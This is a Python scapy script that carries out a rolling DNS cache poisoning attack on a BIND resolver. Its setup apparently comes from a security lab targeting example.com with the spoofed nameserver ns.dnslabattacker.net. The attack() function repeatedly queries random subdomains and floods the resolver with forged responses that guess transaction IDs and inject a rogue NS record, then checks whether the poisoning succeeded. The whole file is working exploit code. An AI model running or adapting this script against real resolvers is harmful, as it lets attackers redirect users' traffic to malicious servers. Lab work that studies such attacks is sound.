#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
query_port = args.query_port
base_domain = 'example.com.'
spoof = 'ns.dnslabattacker.net.'


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=base_domain))
    sendPacket(sock, dnsPacket, my_ip, dns_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

'''
Rolling cache poisoning attacks.
'''
def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.bind((my_ip, my_port))

    dns_request = DNS(qr=0, rd=1, ra=0, an=0, ns=0, ar=0, qd=DNSQR(qname=base_domain))
    fake_response = DNS(id=42, qr=1, rd=1, ra=1, aa=1, 
		qd=DNSQR(qname=base_domain), 
		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
        ar=None
	)

    while (1):
        # per new url
        url = getRandomSubDomain() + '.' + base_domain
        dns_request[DNS].qd.qname = url
        fake_response[DNS].qd.qname = url
        fake_response[DNS].an.rrname = url
        print "Now trying %s\n" % url

        # send dns query
        sendPacket(sock, dns_request, my_ip, dns_port)

        # any higher than 30 is a waste of time
        for i in range(30):
            fake_response[DNS].id = getRandomTXID()
            sendPacket(sock, fake_response, my_ip, query_port)

        # check to see if it worked
        dns_request[DNS].qd.qname = base_domain
        sendPacket(sock, dns_request, my_ip, dns_port)
        response = sock.recv(4096)
        response = DNS(response)
        try:
            if response[DNS].ns[0].rdata == spoof:
                print "Successfully poisoned cache on %s NS" % base_domain[:-1]
                break
            else:
                print "Cache poisoning on %s failed" % url
        except:
            print "Cache poisoning on %s failed" % url

if __name__ == '__main__':
    attack()
